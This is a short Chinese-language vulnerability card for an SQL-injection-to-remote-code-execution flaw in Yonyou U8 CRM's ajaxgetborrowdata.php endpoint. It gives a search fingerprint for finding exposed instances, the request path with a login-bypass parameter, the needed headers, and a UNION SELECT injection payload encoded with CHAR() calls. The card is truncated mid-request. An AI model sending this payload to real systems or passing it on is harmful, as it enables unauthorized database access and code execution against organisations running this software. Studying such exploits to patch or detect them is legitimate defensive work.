# 用友U8CRMajaxgetborrowdata.phpSQL注入致RCE漏洞

- **系统**：用友　|　**类型**：命令执行　|　**CVE**：—
- **指纹**：`title="[用友U8](https://so.csdn.net/so/search?q=用友U8&spm=1001.2101.3001.7020"`
- **请求**：`POST /borrowout/ajaxgetborrowdata.php?DontCheckLogin=1&Action=getWarehouseOtherInfo HTTP/1.1`
- **关键头**：`Cookie: PHPSESSID=bgsesstimeout-;`　`Content-Type: application/x-www-form-urlencoded; charset=utf-8`

**请求体 / payload**
```
cWhCode=1'+UNION+ALL+SELECT+CHAR(113)+CHAR(113)+CHAR(118)+CHAR(106)+CHAR(113)+CHAR(99)+CHAR(105)+CHAR(114)+CHAR(87)+CHAR(120)+CHAR(74)+CHAR(66)+CHAR(106)+CHAR(85)+CHAR(98)+CHAR(86)+CHAR(74)+CHAR(75)+CHAR(68)+CHAR(108)+CHAR(99)+CHAR(114)+CHAR(90)+CHAR(67)+CHAR(74)+CHAR(114)+CHAR(73)+CHAR(76)+CHAR(77)+CHAR(101)+CHAR(70)+CHAR(122)+CHAR(88)+CHAR(86)+CHAR(103)+CHAR(81)+CHAR(99)+CHAR(107)+CHAR(65)+CHAR(68)+CHAR(67)+CHAR(85)+CHAR(76)+CHAR(79)+CHAR(122)+CHAR(113)+CHAR(120)+CHAR(122)+CHAR(98)+CHAR(113)--+KRVC
POST /borrowout/ajaxgetborrowdata.php?DontCheckLogin=1&Action=getInvOtherInfo HTTP/1.1
Host:
C…（脚本共 947 字，完整版见原文）
```
- **预期**：200　|　—